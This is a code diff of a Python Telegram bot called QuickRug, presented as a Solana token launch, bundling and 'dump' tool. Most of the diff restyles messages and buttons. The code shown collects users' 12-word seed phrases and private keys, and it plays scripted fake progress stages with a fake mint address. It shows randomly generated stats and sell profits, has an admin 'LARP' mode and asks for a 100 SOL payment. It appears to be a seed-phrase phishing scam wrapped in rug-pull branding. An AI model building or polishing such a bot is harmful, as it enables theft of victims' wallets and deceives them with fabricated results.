@@ -83,7 +83,15 @@ USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
 
 SOL_EMOJI = "SOL"
-WELCOME_IMAGE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "welcome.jpg")
+_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+# Accept welcome.jpg or welcome.jpeg (GitHub/iOS often renames)
+WELCOME_IMAGE = None
+for _name in ("welcome.jpg", "welcome.jpeg", "welcome.JPG", "welcome.JPEG", "welcome.png"):
+    _p = os.path.join(_BASE_DIR, _name)
+    if os.path.isfile(_p):
+        WELCOME_IMAGE = _p
+        break
+
 
 ERC20_ABI = [
     {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
@@ -1397,33 +1405,33 @@ def main_menu_kb() -> InlineKeyboardMarkup:
 
 
 def back_menu_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← Back", callback_data="menu:main")]])
 
 
 def wallets_empty_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Wallet", callback_data="menu:wallets"))
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Connect", callback_data="wallet:import"))
+    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     return b.as_markup()
 
 
 def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Connect Wallet", callback_data="wallet:import"))
+    b.row(InlineKeyboardButton(text="Connect", callback_data="wallet:import"))
     if has_wallets:
         b.row(
             InlineKeyboardButton(text="Switch", callback_data="wallet:switch"),
             InlineKeyboardButton(text="Refresh", callback_data="wallet:refresh"),
         )
         b.row(InlineKeyboardButton(text="Remove all", callback_data="wallet:clear"))
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     return b.as_markup()
 
 
 def promo_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Enter promo code", callback_data="promo:enter"))
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Enter code", callback_data="promo:enter"))
+    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1452,13 +1460,13 @@ def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
         InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
     )
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     return b.as_markup()
 
 
 def cancel_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")]
+        [InlineKeyboardButton(text="← Back", callback_data="menu:main")]
     ])
 
 
@@ -1476,7 +1484,7 @@ def socials_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="Done", callback_data="socials:done"),
         InlineKeyboardButton(text="Skip", callback_data="socials:skip"),
     )
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1490,7 +1498,7 @@ def bundle_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="15 Wallets", callback_data="bundle:15"),
         InlineKeyboardButton(text="25 Wallets", callback_data="bundle:25"),
     )
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1507,14 +1515,14 @@ def invest_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="50 SOL", callback_data="invest:50"),
     )
     b.row(InlineKeyboardButton(text="✏️ Custom amount", callback_data="invest:custom"))
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     return b.as_markup()
 
 
 def confirm_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Confirm & Save", callback_data="launch:confirm")],
-        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")],
+        [InlineKeyboardButton(text="Confirm", callback_data="launch:confirm")],
+        [InlineKeyboardButton(text="← Back", callback_data="menu:main")],
     ])
 
 
@@ -1545,7 +1553,7 @@ def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
 
 
 def tx_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← Back", callback_data="menu:main")]])
 
 
 # ──────────────────────────────# COPY
@@ -1554,37 +1562,31 @@ def build_main_menu_text(sess: "UserSession") -> str:
     if sess.wallets:
         w = sess.wallets[sess.active_wallet_idx]
         wallet_line = f"<code>{short_addr(w.public_key)}</code> · {SOL_EMOJI} <b>{w.balance_sol:.4f}</b>"
-        status = "Wallet connected."
+        status = "Ready."
     else:
         wallet_line = "Not connected"
-        status = "Press Start to connect your wallet and launch."
+        status = "Connect a wallet to launch."
     return (
-        f"<b>Ready to Launch</b>\n\n"
         f"{status}\n\n"
-        f"Wallet  {wallet_line}\n"
-        f"Launches left  <b>{sess.launches_left}</b>"
+        f"Wallet: {wallet_line}\n"
+        f"Launches left: <b>{sess.launches_left}</b>"
     )
 
 
 
 
 WELCOME_TEXT = (
-    "<b>WELCOME!</b>\n"
-    "⚡ <b>QuickRug</b>\n\n"
-    "Launch · Bundle · Track\n"
-    "Tap a button below to begin."
+    "<b>QuickRug</b>\n"
+    "Launch · Bundle · Track"
 )
 
 
 async def send_main_menu(target, sess: "UserSession"):
     """Send welcome banner + main menu. target = Message or CallbackQuery."""
-    caption = (
-        f"{WELCOME_TEXT}\n\n"
-        + build_main_menu_text(sess).replace("<b>Ready to Launch</b>\n\n", "")
-    )
+    caption = f"{WELCOME_TEXT}\n\n{build_main_menu_text(sess)}"
     kb = main_menu_kb()
     photo = None
-    if os.path.isfile(WELCOME_IMAGE):
+    if WELCOME_IMAGE and os.path.isfile(WELCOME_IMAGE):
         photo = FSInputFile(WELCOME_IMAGE)
     if isinstance(target, CallbackQuery):
         # Prefer new photo message; delete old text if possible
@@ -1674,57 +1676,57 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         # Do NOT auto-create LARP wallet here — /larpseed requires manual Connect
         if LARP_ENABLED and uid in ADMIN_IDS and sess.wallets:
             sync_larp_balances_from_vault(uid)
-        text = "🔑 <b>Wallets</b>\n\n"
+        text = "<b>Wallets</b>\n\n"
         if not sess.wallets:
-            text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
+            text += "No wallet connected.\nPaste a seed or private key to continue."
         else:
             for i, w in enumerate(sess.wallets):
-                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
-                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
+                badge = " · active" if i == sess.active_wallet_idx else ""
+                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n{w.label} · {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
         await cb.message.edit_text(text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)
 
     elif action == "portfolio":
-        text = "📁 <b>Portfolio</b>\n\n"
+        text = "<b>Portfolio</b>\n\n"
         kb = InlineKeyboardBuilder()
         if not sess.launched_tokens:
-            text += "Your portfolio is empty.\n\nLaunch a token to start tracking performance and bundle status."
+            text += "Empty.\nLaunch a token to track it here."
         else:
             live_mints = []
             for t in reversed(sess.launched_tokens[-10:]):
                 age = int(time.time() - t["ts"])
                 if t.get("dumped") or t.get("status") == "dumped":
-                    status_icon = "💸"
-                    extra = f"  ·  profit +{t.get('profit', 0):.2f}"
+                    st = "dumped"
+                    extra = f" · +{t.get('profit', 0):.2f} SOL"
                 elif t.get("status") == "live":
-                    status_icon = "🟢"
-                    extra = f"  ·  invest {t.get('invest', 0):.2f}"
+                    st = "live"
+                    extra = f" · {t.get('invest', 0):.2f} SOL in"
                     live_mints.append(t.get("mint"))
                 else:
-                    status_icon = "🟡"
+                    st = t.get("status") or "—"
                     extra = ""
                 dumped_n = len(t.get("dumped_idxs") or [])
                 if dumped_n and not t.get("dumped"):
-                    extra += f"  ·  dumped {dumped_n}/{t.get('bundle', 0)}"
+                    extra += f" · {dumped_n}/{t.get('bundle', 0)} sold"
                 text += (
-                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
-                    f"   <code>{short_addr(t['mint'])}</code>\n"
-                    f"   Bundle ×{t['bundle']}{extra}  ·  {age}s ago\n\n"
+                    f"<b>${t['symbol']}</b> · {t['name']}\n"
+                    f"<code>{short_addr(t['mint'])}</code>\n"
+                    f"{st} · ×{t['bundle']}{extra} · {age}s\n\n"
                 )
             for m in live_mints[:2]:
-                kb.row(InlineKeyboardButton(text=f"💥 Dump All · {short_addr(m)}", callback_data=f"dump:{m}"))
-        kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+                kb.row(InlineKeyboardButton(text=f"Dump · {short_addr(m)}", callback_data=f"dump:{m}"))
+        kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "promo":
         text = (
-            "🎟️ <b>Promo code</b>\n\n"
+            "<b>Promo</b>\n\n"
             f"Launches left: <b>{sess.launches_left}</b>\n\n"
-            "Use a promo code or pay 100 SOL for more launches."
+            "Enter a code for extra launches or fuel credit."
         )
         await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "tx":
-        text = "🧾 <b>Tx tracker</b>\n\n"
+        text = "<b>Activity</b>\n\n"
         merged = list(sess.last_tx) + list(GLOBAL_TX_FEED)
         merged.sort(key=lambda x: x.get("ts", 0), reverse=True)
         seen = set()
@@ -1738,17 +1740,21 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             if len(feed) >= 10:
                 break
         if not feed:
-            text += "No activity yet.\n\nTransactions from launches, tips and bundles will stream here."
+            text += "No activity yet."
         else:
             for tx in feed:
                 age = int(time.time() - tx["ts"])
-                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
+                st = tx["status"]
                 amt = tx.get("amount")
-                amt_line = f"  ·  {SOL_EMOJI} {amt:+.4f}" if isinstance(amt, (int, float)) else ""
+                amt_line = f" · {amt:+.4f} SOL" if isinstance(amt, (int, float)) else ""
+                # strip emoji noise from type labels
+                tname = tx["type"]
+                for ch in "⚡📦🪙🛡🔄💰🎯📥📤🔐💥👀📈🔎":
+                    tname = tname.replace(ch, "")
+                tname = tname.strip()
                 text += (
-                    f"{icon}  <b>{tx['type']}</b>{amt_line}\n"
-                    f"   <code>{tx['sig'][:22]}...</code>\n"
-                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
+                    f"<b>{tname}</b>{amt_line}\n"
+                    f"<code>{tx['sig'][:20]}…</code> · {st} · {age}s\n\n"
                 )
         await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
 
@@ -1765,17 +1771,11 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
 
     elif action == "scanner":
         text = (
-            "🛡 <b>Token Scanner</b>\n"
-            "\n"
-            "Paste a mint address to run a quick\n"
-            "risk check before you size a bag.\n\n"
-            "Checks\n"
-            "· Mint / freeze authority\n"
-            "· LP lock / burn signals\n"
-            "· Top holder concentration\n"
-            "· Honeypot-style sell sim\n"
-            "· Transfer tax flags\n\n"
-            "Send a mint address now."
+            "<b>Scanner</b>\n\n"
+            "Paste a mint address.\n\n"
+            "Checks mint/freeze authority, LP lock,\n"
+            "holder concentration, sell simulation,\n"
+            "and transfer tax flags."
         )
         await cb.message.edit_text(text, reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(SafetyStates.waiting_mint)
@@ -1793,44 +1793,36 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         success_rate = random.randint(91, 98)
         random.seed()
         text = (
-            "📊 <b>QuickRug Stats</b>\n"
-            "\n"
-            f"Active users (session)  <b>{total_users}</b>\n"
-            f"Launches tracked        <b>{total_launches}</b>\n"
-            f"Live tokens             <b>{live_tokens}</b>\n"
-            f"Fills (24h window)      <b>{fills_24h}</b>\n"
-            f"Est. volume             <b>{vol_24h:.2f} SOL</b>\n"
-            f"Bundle success rate     <b>{success_rate}%</b>\n\n"
-            f"Your launches left      <b>{sess.launches_left}</b>\n"
-            f"Your wallets            <b>{len(sess.wallets)}</b>\n\n"
-            "<i>Stats refresh hourly.</i>"
+            "<b>Stats</b>\n\n"
+            f"Users: <b>{total_users}</b>\n"
+            f"Launches: <b>{total_launches}</b>\n"
+            f"Live: <b>{live_tokens}</b>\n"
+            f"Fills (24h): <b>{fills_24h}</b>\n"
+            f"Volume: <b>{vol_24h:.2f} SOL</b>\n"
+            f"Success: <b>{success_rate}%</b>\n\n"
+            f"Your launches left: <b>{sess.launches_left}</b>\n"
+            f"Your wallets: <b>{len(sess.wallets)}</b>"
         )
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="Refresh", callback_data="menu:stats"))
-        kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+        kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "about":
         text = (
-            "ℹ️ <b>About QuickRug</b>\n"
-            "\n"
-            "Solana launch toolkit built for\n"
-            "speed, protection and clean fills.\n\n"
-            "<b>What you get</b>\n"
-            "· Guided token launch flow\n"
+            "<b>About</b>\n\n"
+            "Solana launch toolkit.\n"
+            "Bundle, protect, track.\n\n"
+            "· Guided launch flow\n"
             "· Multi-wallet bundling (5–25)\n"
-            "· Sniper + MEV protection toggles\n"
-            "· Live activity feed\n"
-            "· On-demand mint scanner\n\n"
-            "<b>Safety notes</b>\n"
-            "· Keys stay in session memory only\n"
-            "· Always run Scanner before sizing\n"
-            "· You control slippage + priority fee\n\n"
-            "Need more launches? Open Promo."
+            "· Sniper / MEV toggles\n"
+            "· Activity feed + mint scanner\n\n"
+            "Keys stay in session memory only.\n"
+            "You control slippage and priority fee."
         )
         kb = InlineKeyboardBuilder()
-        kb.row(InlineKeyboardButton(text="🎟️ Promo", callback_data="menu:promo"))
-        kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+        kb.row(InlineKeyboardButton(text="Promo", callback_data="menu:promo"))
+        kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     await cb.answer()
@@ -1914,7 +1906,7 @@ async def custom_fee_receive(message: Message, state: FSMContext):
 @router.callback_query(F.data == "wallet:import")
 async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     text = (
-        "<b>Connect Wallet</b>\n\n"
+        "<b>Connect</b>\n\n"
         "Please provide your 12-word seed phrase:\n\n"
         "Requirements:\n"
         "• Exactly 12 words\n"
@@ -1922,7 +1914,7 @@ async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
         "Security: Only enter seed phrases for wallets you trust."
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")]
+        [InlineKeyboardButton(text="← Back", callback_data="menu:main")]
     ])
     await cb.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_import)
@@ -1953,12 +1945,12 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         and pending_phrase_e
         and _normalize_mnemonic(raw) == _normalize_mnemonic(pending_phrase_e)
     ):
-        status_msg = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)
+        status_msg = await message.answer("<b>Validating…</b>", parse_mode=ParseMode.HTML)
         for txt, delay in [
-            ("🔗 <b>Deriving paths…</b>", 0.7),
-            ("📡 <b>Checking balances…</b>", 0.9),
-            ("🛡 <b>Safety scan…</b>", 0.6),
-            ("✅ <b>Connecting wallet…</b>", 0.5),
+            ("<b>Deriving paths…</b>", 0.7),
+            ("<b>Checking balances…</b>", 0.9),
+            ("<b>Safety scan…</b>", 0.6),
+            ("<b>Connecting…</b>", 0.5),
         ]:
             try:
                 await status_msg.edit_text(txt, parse_mode=ParseMode.HTML)
@@ -1988,7 +1980,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         _save_state()
         try:
             await status_msg.edit_text(
-                f"✅ <b>Wallet connected</b>\n\n"
+                f"<b>Connected</b>\n\n"
                 f"<code>{short_addr(pub)}</code>\n"
                 f"Balance <b>{SOL_EMOJI} {bal:.4f}</b>",
                 parse_mode=ParseMode.HTML,
@@ -2004,7 +1996,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         await message.answer(panel, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
         return
 
-    status_msg = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)
+    status_msg = await message.answer("<b>Validating…</b>", parse_mode=ParseMode.HTML)
 
     chosen_priv = None
     chosen_pub = None
@@ -2024,7 +2016,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         is_seed = _is_mnemonic(clean)
 
         if is_seed and HAS_SOLANA:
-            await status_msg.edit_text("🔗 <b>Deriving paths…</b>", parse_mode=ParseMode.HTML)
+            await status_msg.edit_text("<b>Deriving paths…</b>", parse_mode=ParseMode.HTML)
             candidates = derive_solana_paths(clean)
             label, chosen_priv, chosen_pub, chosen_bal = await pick_best_sol_candidate(candidates)
 
@@ -2089,7 +2081,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
 
     except Exception as e:
         log.exception("Import failed: %s", e)
-        await status_msg.edit_text("❌ <b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
+        await status_msg.edit_text("<b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
         await state.clear()
         return
 
@@ -2410,7 +2402,7 @@ async def launch_invest_custom(message: Message, state: FSMContext):
     try:
         invest = float((message.text or "").strip().replace(",", ""))
     except ValueError:
-        await message.answer("❌ Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
+        await message.answer("Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
         return
     if invest < 3:
         await message.answer("❌ Minimum invest is <b>3 SOL</b>. Try again.", parse_mode=ParseMode.HTML)
@@ -2564,23 +2556,23 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     )
 
     stages = [
-        (f"<b>${symbol}</b> · deriving {bundle} keypairs…", 0.7),
-        (f"<b>${symbol}</b> · funding {bundle} wallets · <code>{per_wallet:.4f}</code> SOL each", 0.95),
-        (f"<b>${symbol}</b> · creating mint on pump…", 0.85),
-        (f"<b>${symbol}</b> · mint <code>{fake_mint()[:12]}…</code>", 0.6),
-        (f"<b>${symbol}</b> · uploading metadata + socials…", 0.75),
-        (f"<b>${symbol}</b> · building atomic bundle · slot ~{slot}", 1.0),
-        (f"<b>${symbol}</b> · simulating {bundle} buys…", 0.8),
-        (f"<b>${symbol}</b> · Jito tip <code>{tip:.4f} SOL</code> · submitting…", 0.9),
-        (f"<b>${symbol}</b> · bundle in mempool…", 0.7),
-        (f"<b>${symbol}</b> · landing… confirmations 1/2", 0.85),
-        (f"<b>${symbol}</b> · bonding curve live · snipers detected", 0.7),
+        (f"<b>${symbol}</b>\nDeriving {bundle} keypairs…", 0.65),
+        (f"<b>${symbol}</b>\nFunding {bundle} wallets · {per_wallet:.4f} SOL each", 0.85),
+        (f"<b>${symbol}</b>\nCreating mint…", 0.75),
+        (f"<b>${symbol}</b>\nMint <code>{fake_mint()[:12]}…</code>", 0.55),
+        (f"<b>${symbol}</b>\nUploading metadata…", 0.65),
+        (f"<b>${symbol}</b>\nBuilding bundle · slot ~{slot}", 0.9),
+        (f"<b>${symbol}</b>\nSimulating {bundle} buys…", 0.7),
+        (f"<b>${symbol}</b>\nJito tip {tip:.4f} SOL · submitting", 0.85),
+        (f"<b>${symbol}</b>\nIn mempool…", 0.6),
+        (f"<b>${symbol}</b>\nLanding · 1/2", 0.75),
+        (f"<b>${symbol}</b>\nCurve live · snipers detected", 0.6),
         (
-            f"✅ <b>${symbol}</b> live\n\n"
-            f"Bundle ×{bundle} · <code>{per_wallet:.4f}</code> SOL / wallet\n"
-            f"Tip <code>{tip:.4f} SOL</code> · slot {slot}\n"
-            f"Sniper guard ON · curve open · waiting for fills",
-            0.35,
+            f"<b>${symbol}</b> live\n\n"
+            f"Bundle ×{bundle} · {per_wallet:.4f} SOL / wallet\n"
+            f"Tip {tip:.4f} SOL · slot {slot}\n"
+            f"Sniper guard on · waiting for fills",
+            0.3,
         ),
     ]
     await staged_loading(cb, stages)
@@ -2710,7 +2702,7 @@ async def dump_one(cb: CallbackQuery):
     returned = round(per * random.uniform(1.55, 3.2), 4)
     dumped.add(idx)
     token["dumped_idxs"] = sorted(dumped)
-    add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=returned)
+    add_personal_tx(sess, f"Dump wallet {idx}", "success", amount=returned)
 
     addr = ""
     bw = token.get("bundle_wallets") or []
@@ -2720,14 +2712,14 @@ async def dump_one(cb: CallbackQuery):
     pulse = await cb.message.answer(
         f"<b>${sym}</b> · wallet {idx}\n"
         f"<code>{addr or short_addr(fake_mint())}</code>\n"
-        f"building sell…",
+        f"Building sell…",
         parse_mode=ParseMode.HTML,
     )
     for step_txt, delay in [
-        (f"<b>${sym}</b> · wallet {idx}\nquoting route…", 0.45),
-        (f"<b>${sym}</b> · wallet {idx}\nrouting via Jito · tip attached", 0.55),
-        (f"<b>${sym}</b> · wallet {idx}\nin mempool…", 0.4),
-        (f"<b>${sym}</b> · wallet {idx}\nlanding sell…", 0.5),
+        (f"<b>${sym}</b> · wallet {idx}\nQuoting route…", 0.45),
+        (f"<b>${sym}</b> · wallet {idx}\nRouting · Jito tip", 0.55),
+        (f"<b>${sym}</b> · wallet {idx}\nIn mempool…", 0.4),
+        (f"<b>${sym}</b> · wallet {idx}\nLanding…", 0.5),
     ]:
         await asyncio.sleep(delay)
         try:
@@ -2736,7 +2728,7 @@ async def dump_one(cb: CallbackQuery):
             pass
     try:
         await pulse.edit_text(
-            f"✅ wallet {idx} sold · <b>+{returned:.4f} SOL</b>\n"
+            f"Wallet {idx} sold · <b>+{returned:.4f} SOL</b>\n"
             f"<code>{addr or ''}</code>",
             parse_mode=ParseMode.HTML,
         )
@@ -2812,60 +2804,53 @@ async def dump_all(cb: CallbackQuery):
 
     try:
         await cb.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⏳ Dumping…", callback_data="noop")]
+            [InlineKeyboardButton(text="Dumping…", callback_data="noop")]
         ]))
     except Exception:
         pass
 
     status = await cb.message.answer(
-        f"💥 <b>DUMP ${symbol}</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Bundle ×{bundle} · invested <code>{invest:.4f} SOL</code>\n"
+        f"<b>Dump ${symbol}</b>\n\n"
+        f"Bundle ×{bundle} · {invest:.4f} SOL in\n"
         f"MC ~${start_mcap:,} · {start_holders} holders\n\n"
-        f"Arming sells…",
+        f"Preparing sells…",
         parse_mode=ParseMode.HTML,
     )
 
     stages_pre = [
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Dump ${symbol}</b>\n\n"
             f"MC ~${start_mcap:,} · {start_holders} holders\n"
-            f"Scanning orderbook…",
+            f"Scanning book…",
             0.55,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Detected <b>{random.randint(6, 22)} open buys</b>\n"
+            f"<b>Dump ${symbol}</b>\n\n"
+            f"{random.randint(6, 22)} open buys detected\n"
             f"Estimating impact…",
             0.65,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Dump ${symbol}</b>\n\n"
             f"Building {bundle} sell routes\n"
-            f"Split across AMMs · anti-sandwich ON",
+            f"Anti-sandwich on",
             0.75,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Dump ${symbol}</b>\n\n"
             f"Signing {bundle} wallets…\n"
-            f"Priority fee maxed · Jito tips attached",
+            f"Priority max · Jito tips",
             0.7,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"All {bundle} wallets signed\n"
-            f"Waiting for next leader slot…",
+            f"<b>Dump ${symbol}</b>\n\n"
+            f"All wallets signed\n"
+            f"Waiting for slot…",
             0.6,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Bundle in mempool\n"
+            f"<b>Dump ${symbol}</b>\n\n"
+            f"In mempool\n"
             f"Landing…",
             0.55,
         ),
@@ -2895,7 +2880,7 @@ async def dump_all(cb: CallbackQuery):
             wave_return = round(wave_return + part, 4)
             returned_total = round(returned_total + part, 4)
             dumped_idxs.append(idx)
-            add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=part)
+            add_personal_tx(sess, f"Dump wallet {idx}", "success", amount=part)
         token["dumped_idxs"] = sorted(dumped_idxs)
         done = len(dumped_idxs)
         progress = done / max(1, bundle)
@@ -2905,16 +2890,15 @@ async def dump_all(cb: CallbackQuery):
         bar_filled = int(progress * 10)
         bar = "█" * bar_filled + "░" * (10 - bar_filled)
         lines = [
-            f"💥 <b>DUMPING ${symbol}</b>",
-            f"━━━━━━━━━━━━━━━━━━━━",
+            f"<b>Dumping ${symbol}</b>",
             f"",
             f"<code>{bar}</code>  {done}/{bundle}",
             f"",
-            f"Sold this wave   <b>+{wave_return:.4f} SOL</b>",
-            f"Running total    <code>{returned_total:.4f} SOL</code>",
-            f"Unrealized PnL   <b>{pnl_now:+.4f} SOL</b>",
+            f"Wave: <b>+{wave_return:.4f} SOL</b>",
+            f"Total: <code>{returned_total:.4f} SOL</code>",
+            f"PnL: <b>{pnl_now:+.4f} SOL</b>",
             f"",
-            f"MC ~${mcap_now:,}  ·  holders {holders_left}",
+            f"MC ~${mcap_now:,} · holders {holders_left}",
         ]
         if done < bundle:
             lines.append(f"{bundle - done} wallets still open")
@@ -2941,7 +2925,7 @@ async def dump_all(cb: CallbackQuery):
     token["dumped_idxs"] = list(range(1, bundle + 1))
     token["mcap"] = random.randint(300, 1800)
 
-    add_personal_tx(sess, f"💥 DUMP ALL ${symbol}", "success", amount=returned_total)
+    add_personal_tx(sess, f"Dump all ${symbol}", "success", amount=returned_total)
     add_personal_tx(sess, "💰 Profit Claim", "success", amount=profit)
     add_personal_tx(sess, "📊 PnL Settled", "success", amount=profit)
 
@@ -2970,7 +2954,7 @@ async def dump_all(cb: CallbackQuery):
             0.6,
         ),
         (
-            f"✅ <b>DUMP COMPLETE</b>\n"
+            f"<b>Dump complete</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━\n\n"
             f"<b>${symbol}</b>\n"
             f"<code>{mint}</code>\n\n"
@@ -3074,7 +3058,7 @@ async def promo_pay(cb: CallbackQuery):
     )
     kb = InlineKeyboardBuilder()
     kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
-    kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
     await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
     await cb.answer()
 
@@ -3132,7 +3116,7 @@ async def promo_code(message: Message, state: FSMContext):
             )
             await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     else:
-        await message.answer("❌ Invalid or expired code.", reply_markup=main_menu_kb())
+        await message.answer("Invalid or expired code.", reply_markup=main_menu_kb())
     await state.clear()
 
 
@@ -3566,16 +3550,16 @@ async def cmd_dumpnow(message: Message):
     bundle = int(token.get("bundle") or 10)
     invest = float(token.get("invest") or 3)
     status = await message.answer(
-        f"💥 <b>FORCE DUMP ${symbol}</b>\n"
+        f"<b>Force dump ${symbol}</b>\n"
         f"Arming {bundle} wallets…",
         parse_mode=ParseMode.HTML,
     )
     for txt, delay in [
-        (f"💥 <b>${symbol}</b> · scanning book…", 0.5),
-        (f"💥 <b>${symbol}</b> · signing sells · Jito tips…", 0.6),
-        (f"💥 <b>${symbol}</b> · landing wave 1/{max(1, bundle//3)}…", 0.55),
